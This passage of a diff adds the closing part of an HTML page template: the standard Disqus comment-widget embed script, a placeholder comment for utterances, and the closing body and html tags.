+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
